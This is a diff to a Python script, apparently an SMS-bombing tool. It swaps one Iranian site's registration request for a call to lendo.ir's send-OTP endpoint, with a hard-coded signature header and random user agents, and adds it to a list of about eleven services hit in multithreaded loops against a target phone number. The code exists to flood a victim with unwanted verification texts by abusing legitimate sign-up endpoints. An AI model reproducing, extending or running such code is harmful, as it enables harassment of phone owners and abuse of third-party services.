@@ -64,54 +64,62 @@ def send_service_safe(service, phone):
 # ==========================
 
 
-
-def Shixon(phone):
+def Lendo(phone):
     try:
-        # استفاده از مقادیر ثابت از آخرین درخواست موفق
-        token = "nsiZcchCa525lSgwapj0qI9Lw2XiHfdCXFtZ7DdpWEaPAW-CN3gorN8EaJqERJC3Wbn8DQqqIS5nt3CrVK3gG8Jm3c8ESVdaKwkVC_fBjsw1"
+        url = "https://api2.lendo.ir/api/customer/auth/send-otp"
         
+        # فرمت شماره
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
         
-        # payload دقیقاً مانند درخواست موفق
-        payload = {
-            "M": formatted_phone,
-            "P": "pass123", 
-            "s": "888",
-            "PU": "",  # طبق درخواست موفق، این فیلد خالی هست
-            "__RequestVerificationToken": token
-        }
+        # تولید timestamp
+        timestamp = str(int(time.time() * 1000))
         
         headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "sha": "SIGN suoFyEBf+aqzIwx82ArDq3BdwxHUuj6mkkzuO3TSK495B//J+4Yf4yTh0c7BNcAfkED0tRBB8vYryDiO8dxb+w==",
+            "X-Timestamp": timestamp,
             "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept": "text/html, */*; q=0.01",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://www.shixon.com",
-            "Referer": "https://www.shixon.com/Home/RegisterUser",
+            "Origin": "https://lendo.ir",
+            "Referer": "https://lendo.ir/",
+        }
+        
+        payload = {
+            "mobile": formatted_phone
         }
         
         response = requests.post(
-            "https://www.shixon.com/Home/RegisterUser",
-            data=payload,
-            headers=headers,
+            url, 
+            json=payload, 
+            headers=headers, 
             timeout=10
         )
         
-        print(f'{y}[Debug] Shixon Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Lendo Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Lendo Response: {response.text}{a}')
         
-        # هر پاسخی زیر 500 را موفقیت در نظر بگیریم
-        if response.status_code < 500:
-            print(f'{g}(Shixon) Request completed (Status: {response.status_code}){a}')
-            return True
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("status") == "success":
+                    print(f'{g}(Lendo) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] Lendo Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "sent" in response.text.lower():
+                    print(f'{g}(Lendo) Code Sent{a}')
+                    return True
+                return False
         else:
-            print(f'{r}[-] Shixon Server Error: {response.status_code}{a}')
+            print(f'{r}[-] Lendo HTTP Error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f'{r}[!] Shixon Exception: {e}{a}')
+        print(f'{r}[!] Lendo Exception: {e}{a}')
         return False
-
 
 
 
@@ -896,7 +904,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [Balad, Besparto, Charsooq, DigikalaJet, Footini, Koohshid, nillarayeshi, Okala, ShahreSandal, Shixon, SibApp]
+services = [Balad, Besparto, Charsooq, DigikalaJet, Footini, Koohshid, Lendo, nillarayeshi, Okala, ShahreSandal, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
